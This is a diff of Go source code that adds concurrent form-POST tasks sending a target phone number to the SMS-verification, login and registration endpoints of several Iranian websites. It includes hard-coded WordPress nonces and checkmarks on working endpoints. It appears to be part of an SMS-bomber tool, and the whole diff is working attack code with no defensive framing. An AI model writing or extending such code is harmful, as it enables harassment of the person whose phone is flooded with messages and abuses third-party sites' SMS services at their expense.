@@ -1696,7 +1696,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-// --- 4hair.ir (POST, FORM)
+// --- 4hair.ir (POST, FORM) ✅ 
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
@@ -1707,24 +1707,91 @@ tasks <- func(c *http.Client) func() {
         formData.Set("type", "mobile")
         formData.Set("captcha", "")
         formData.Set("captchahash", "")
-        formData.Set("security", "dfd624b63d")
+        formData.Set("security", "dfd624b63d") //check
         sendFormRequest(c, ctx, "https://4hair.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
     }
 }(client)
 
-// --- zzzagros.com (POST, FORM)
+// --- zzzagros.com (POST, FORM) ✅ 
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
         formData := url.Values{}
         formData.Set("action", "awsa-login-with-phone-send-code")
-        formData.Set("nonce", "19b172d9c2") 
+        formData.Set("nonce", "19b172d9c2")  //check
         formData.Set("username", phone)
         sendFormRequest(c, ctx, "https://www.zzzagros.com/wp-admin/admin-ajax.php", formData, &wg, ch)
     }
 }(client)
 
+		// see5.net (Form) ✅ 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				formData := url.Values{}
+				formData.Set("mobile", phone)
+				formData.Set("name", "monsmain")
+				formData.Set("demo", "bz_sh_template05")
+				sendFormRequest(c, ctx, "https://see5.net/wp-content/themes/see5/webservice_demo2.php", formData, &wg, ch)
+			}
+		}(client) 
 
+                 // naabshop.com  ✅ 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("login_digt_countrycode", "+98")
+				formData.Set("digits_phone", formatPhoneWithSpaces(phone)) 
+				formData.Set("action_type", "phone")
+				formData.Set("digits_reg_name", "testname") 
+				formData.Set("digits_reg_lastname", "testlastname") 
+				formData.Set("digits_process_register", "1")
+				formData.Set("sms_otp", "")
+				formData.Set("otp_step_1", "1")
+				formData.Set("signup_otp_mode", "1")
+				formData.Set("rememberme", "1")
+				formData.Set("digits", "1")
+				formData.Set("instance_id", "6ecab4b3cccd3725e942ca7219014764")   //check
+				formData.Set("action", "digits_forms_ajax")
+				formData.Set("type", "login")
+				formData.Set("digits_step_1_type", "")
+				formData.Set("digits_step_1_value", "")
+				formData.Set("digits_step_2_type", "")
+				formData.Set("digits_step_2_value", "")
+				formData.Set("digits_step_3_type", "")
+				formData.Set("digits_step_3_value", "")
+				formData.Set("digits_login_email_token", "")
+				formData.Set("digits_redirect_page", "//naabshop.com/") 
+				formData.Set("digits_form", "18751deacf")  //check
+				formData.Set("_wp_http_referer", "/") 
+				formData.Set("show_force_title", "1")
+				formData.Set("container", "digits_protected")
+				formData.Set("sub_action", "sms_otp")
+
+				sendFormRequest(c, ctx, "https://naabshop.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+		}(client)
+
+		// itmall.ir (Form) ✅ 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				formData := url.Values{}
+				formData.Set("action", "digits_check_mob")
+				formData.Set("countrycode", "+98")
+				formData.Set("mobileNo", phone)
+				formData.Set("csrf", "55e2fb3616")  //check
+				formData.Set("login", "2")
+				formData.Set("username", "")
+				formData.Set("email", "")
+				formData.Set("captcha", "")
+				formData.Set("captcha_ses", "")
+				formData.Set("json", "1")
+				formData.Set("whatsapp", "0")
+				sendFormRequest(c, ctx, "https://itmall.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
+			}
+		}(client) 
 
 
 
